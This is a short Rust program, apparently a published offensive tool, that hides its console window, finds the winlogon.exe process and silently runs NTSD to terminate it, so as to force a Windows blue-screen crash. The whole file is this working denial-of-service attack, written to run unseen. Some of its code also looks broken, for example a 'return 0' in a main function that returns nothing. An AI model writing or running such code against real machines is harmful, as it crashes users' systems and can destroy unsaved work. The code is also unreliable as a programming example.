/*
    Trigger BSOD by triggeing NTSD on winlogon.exe 
    @5mukx
*/

use std::ffi::CString;
use std::process::Command;
use winapi::um::wincon::GetConsoleWindow;
use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::winnt::HANDLE;
use winapi::um::winuser::{ShowWindow, SW_HIDE};

fn find_pid(procname: &str) -> Option<u32> {
    unsafe {
        let h_snapshot: HANDLE = CreateToolhelp32Snapshot(winapi::um::tlhelp32::TH32CS_SNAPPROCESS, 0);
        if h_snapshot == INVALID_HANDLE_VALUE {
            return None;
        }

        let mut pe: PROCESSENTRY32 = std::mem::zeroed();
        pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

        let mut h_result = Process32First(h_snapshot, &mut pe);
        while h_result != 0 {
            let exe_file = CString::new(procname).unwrap();
            let current_exe_file = CString::new(pe.szExeFile.iter().map(|&c| c as u8).collect::<Vec<u8>>()).unwrap();

            if exe_file.as_c_str() == current_exe_file.as_c_str() {
                CloseHandle(h_snapshot);
                return Some(pe.th32ProcessID);
            }
            h_result = Process32Next(h_snapshot, &mut pe);
        }

        CloseHandle(h_snapshot);
        None
    }
}

fn main() {
    unsafe {
        let h_wnd = GetConsoleWindow();
        ShowWindow(h_wnd, SW_HIDE);
    
        let pid = find_pid("winlogon.exe").or_else(|| find_pid("WINLOGON.EXE"));

        if let Some(pid) = pid {
            let command = format!("cmd /c start /min ntsd -c q -p {} 1>nul 2>nul", pid);
            Command::new("cmd")
                .args(&["/C", &command])
                .status()
                .expect("Failed to execute command");
        } else {
            println!("Process not found.");
            return 0;
        }
    }
}

